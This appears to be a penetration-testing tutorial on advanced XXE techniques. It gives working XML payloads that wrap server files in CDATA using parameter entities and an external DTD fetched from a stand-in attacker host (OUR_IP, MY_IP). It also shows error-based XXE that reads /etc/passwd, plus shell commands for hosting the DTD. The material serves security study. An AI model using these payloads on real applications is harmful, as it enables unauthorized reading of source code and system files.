# Advanced File Disclosure
***
#### As some file formats may not be readable through basic XXE, or the web application  may not output any input values in some instances, we may try to force it through errors.

### Advanced Exfiltration with CDATA
#### While we can use PHP filters to encode PHP source files, we could also wrap the content of the external file reference with a `CDATA` tag (to tell the XML parser that the data should not be treated as XML but instead as literal test) (e.g. `<![CDATA[FILE_CONTENT]]>`) to extract any kind of data for any web application backend.
#### One way to resolve this issue would be to define a `begin` internal entity with `<![CDATA[` , an end internal entity with `]]>` , and then place the external entity file in between:
```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/checkUsers.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```
#### Then if we reference the `&joined;` entity , it should contain the escaped data, however this won't work , since XML prevents joining internal and external entities.
#### In order to bypass this limitation , we can use `XML Parameter Entities` , these are a special type of entity that starts with a `%`character and can only be used within the DTD. This would allow us to reference the parameter entities from an external source and then all of them would be considered as external and can be joined:
```xml
<!ENTITY joined "%begin;%file;%end;">
```

#### We first write to a .dtd file on our server the xml code above and then start an HTTP server
```shell
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000
```
#### After we can reference the external entity above (`xxe.dtd`) and then print the `&joined;` entity defined above:
```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/checkUsers.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>
...
<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
```


#### **NOTE:** In certain cases we may  not be able to read some files, such as index.php, because the web server would be preventing a DoS attack caused by file/entity self-reference (i.e., XL entity reference loop).

### Error based XXE
#### When a web application might not write any output, we would be blind to the XML output and thus not able to exfiltrate the file content using the previous methods.
#### However, if the web application displays runtime error (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.
* Firstly , we would try to send malformed XML data , and see if the web application displays any errors.
* Then we would host a DTD file containing the following payload:
  * ```xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
    ``` 
* In the above payload we defined the `file` entity and then joined it with an entity that does not exist. This will cause the web application to throw an error saying that this entity does not exist, with the `%file;`as part of the error.
* Finally, we would call our external DTD script, and then reference the error entity as follows:
 * ```xml
   <!DOCTYPE email [ 
   <!ENTITY % remote SYSTEM "http://MY_IP:1337/xxe.dtd">
   %remote;
   %error;
   ]>
   ```